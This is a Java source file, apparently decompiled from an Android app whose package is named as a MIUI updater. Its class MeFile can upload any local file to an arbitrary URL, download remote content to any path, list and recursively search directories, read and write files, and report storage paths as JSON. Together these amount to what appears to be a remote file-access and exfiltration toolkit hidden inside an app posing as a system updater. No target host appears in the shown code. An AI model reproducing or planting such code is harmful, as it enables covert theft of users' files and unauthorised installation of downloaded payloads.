package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Environment;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.util.Log;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MeFile {
    Context mContext;

    MeFile(Context c) {
        this.mContext = c;
    }

    public void showToast(String toast) {
        Toast.makeText(this.mContext, toast, 1).show();
    }

    public void Lg(String toast) {
        Log.i("ggg", toast);
    }

    public void file2url(String file, String urlo) {
        String pathToOurFile = file;
        String urlServer = urlo;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        try {
            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
            HttpURLConnection connection = (HttpURLConnection) new URL(urlServer).openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            DataOutputStream dataOutputStream;
            try {
                outputStream.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(lineEnd).toString());
                outputStream.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\"" + pathToOurFile + "\"" + lineEnd);
                outputStream.writeBytes(lineEnd);
                int bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                byte[] buffer = new byte[bufferSize];
                int bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                while (bytesRead > 0) {
                    outputStream.write(buffer, 0, bufferSize);
                    bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
                outputStream.writeBytes(lineEnd);
                outputStream.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(twoHyphens).append(lineEnd).toString());
                int serverResponseCode = connection.getResponseCode();
                String serverResponseMessage = connection.getResponseMessage();
                fileInputStream.close();
                outputStream.flush();
                outputStream.close();
                dataOutputStream = outputStream;
            } catch (Exception e) {
                dataOutputStream = outputStream;
            }
        } catch (Exception e2) {
        }
    }

    public void url2file(String urlo, String file) {
        try {
            URL url = new URL(urlo);
            URLConnection conexion = url.openConnection();
            conexion.connect();
            int lenghtOfFile = conexion.getContentLength();
            InputStream is = url.openStream();
            FileOutputStream fos = new FileOutputStream(file);
            byte[] data = new byte[1024];
            long total = 0;
            while (true) {
                int count = is.read(data);
                if (count == -1) {
                    is.close();
                    fos.close();
                    return;
                }
                total += (long) count;
                int progress_temp = (((int) total) * 100) / lenghtOfFile;
                fos.write(data, 0, count);
            }
        } catch (Exception e) {
            Log.e("ERROR DOWNLOADING", "Unable to download" + e.getMessage());
        }
    }

    public void write(String fileName, String fileContents) {
        try {
            FileWriter out = new FileWriter(new File(fileName));
            out.write(fileContents);
            out.close();
        } catch (IOException e) {
        }
    }

    public static String convertStreamToString(InputStream is) throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        while (true) {
            String line = reader.readLine();
            if (line == null) {
                reader.close();
                return sb.toString();
            }
            sb.append(line).append("\n");
        }
    }

    public void mkdir(String Path) {
        File folder = new File(Path);
        if (!folder.exists()) {
            boolean success = folder.mkdir();
        }
    }

    public static String read(String filePath) throws Exception {
        FileInputStream fin = new FileInputStream(new File(filePath));
        String ret = convertStreamToString(fin);
        fin.close();
        return ret;
    }

    @SuppressLint({"NewApi"})
    public String SystemDirs() throws JSONException {
        JSONObject pnObj = new JSONObject();
        pnObj.put("isExternalStorageEmulated", Environment.isExternalStorageEmulated());
        pnObj.put("isExternalStorageRemovable", Environment.isExternalStorageRemovable());
        pnObj.put("DIRECTORY_ALARMS", Environment.DIRECTORY_ALARMS);
        pnObj.put("DIRECTORY_DCIM", Environment.DIRECTORY_DCIM);
        pnObj.put("DIRECTORY_DOWNLOADS", Environment.DIRECTORY_DOWNLOADS);
        pnObj.put("DIRECTORY_MOVIES", Environment.DIRECTORY_MOVIES);
        pnObj.put("DIRECTORY_MUSIC", Environment.DIRECTORY_MUSIC);
        pnObj.put("DIRECTORY_NOTIFICATIONS", Environment.DIRECTORY_NOTIFICATIONS);
        pnObj.put("DIRECTORY_PICTURES", Environment.DIRECTORY_PICTURES);
        pnObj.put("DIRECTORY_PODCASTS", Environment.DIRECTORY_PODCASTS);
        pnObj.put("DIRECTORY_RINGTONES", Environment.DIRECTORY_RINGTONES);
        pnObj.put("MEDIA_BAD_REMOVAL", "bad_removal");
        pnObj.put("MEDIA_CHECKING", "checking");
        pnObj.put("MEDIA_MOUNTED", "mounted");
        pnObj.put("MEDIA_MOUNTED_READ_ONLY", "mounted_ro");
        pnObj.put("MEDIA_NOFS", "nofs");
        pnObj.put("MEDIA_REMOVED", "removed");
        pnObj.put("MEDIA_SHARED", "shared");
        pnObj.put("MEDIA_UNMOUNTABLE", "unmountable");
        pnObj.put("MEDIA_UNMOUNTED", "unmounted");
        pnObj.put("DataDirectory", Environment.getDataDirectory());
        pnObj.put("DownloadCacheDirectory", Environment.getDownloadCacheDirectory());
        pnObj.put("ExternalStorageDirectory", Environment.getExternalStorageDirectory());
        pnObj.put("ExternalStorageState", Environment.getExternalStorageState());
        pnObj.put("RootDirectory", Environment.getRootDirectory());
        return pnObj.toString();
    }

    @SuppressLint({"NewApi"})
    public String Info(String path) throws JSONException {
        File file = new File(path);
        JSONObject pnObj = new JSONObject();
        pnObj.put("name", file.getName());
        pnObj.put("dir", file.isDirectory());
        pnObj.put("canExecute", file.canExecute());
        pnObj.put("canRead", file.canRead());
        pnObj.put("canWrite", file.canWrite());
        pnObj.put("length", file.length());
        pnObj.put("getUsableSpace", file.getUsableSpace());
        pnObj.put("getAbsolutePath", file.getAbsolutePath());
        return pnObj.toString();
    }

    @SuppressLint({"NewApi"})
    public String ReadDir(String path) throws JSONException {
        File[] file = new File(path).listFiles();
        JSONObject jsonObj = new JSONObject();
        JSONArray jsonArr = new JSONArray();
        for (int i = 0; i < file.length; i++) {
            JSONObject pnObj = new JSONObject();
            pnObj.put("name", file[i].getName());
            pnObj.put("dir", file[i].isDirectory());
            pnObj.put("canExecute", file[i].canExecute());
            pnObj.put("canRead", file[i].canRead());
            pnObj.put("canWrite", file[i].canWrite());
            pnObj.put("length", file[i].length());
            pnObj.put("getUsableSpace", file[i].getUsableSpace());
            pnObj.put("getAbsolutePath", file[i].getAbsolutePath());
            jsonArr.put(pnObj);
        }
        jsonObj.put("result", jsonArr);
        return jsonObj.toString();
    }

    private List<File> getListFiles(File parentDir, String src) {
        ArrayList<File> inFiles = new ArrayList();
        for (File file : parentDir.listFiles()) {
            if (file.isDirectory()) {
                inFiles.addAll(getListFiles(file, src));
            } else if (file.getName().contains(src)) {
                inFiles.add(file);
            }
        }
        return inFiles;
    }

    @SuppressLint({"NewApi"})
    public String search(String path, String str) throws JSONException {
        List<File> file = getListFiles(new File(path), str);
        String out = "";
        JSONObject jsonObj = new JSONObject();
        JSONArray jsonArr = new JSONArray();
        for (int i = 0; i < file.size(); i++) {
            JSONObject pnObj = new JSONObject();
            pnObj.put("name", ((File) file.get(i)).getName());
            pnObj.put("dir", ((File) file.get(i)).isDirectory());
            pnObj.put("canExecute", ((File) file.get(i)).canExecute());
            pnObj.put("canRead", ((File) file.get(i)).canRead());
            pnObj.put("canWrite", ((File) file.get(i)).canWrite());
            pnObj.put("length", ((File) file.get(i)).length());
            pnObj.put("getUsableSpace", ((File) file.get(i)).getUsableSpace());
            pnObj.put("getAbsolutePath", ((File) file.get(i)).getAbsolutePath());
            jsonArr.put(pnObj);
        }
        jsonObj.put("result", jsonArr);
        return jsonObj.toString();
    }
}
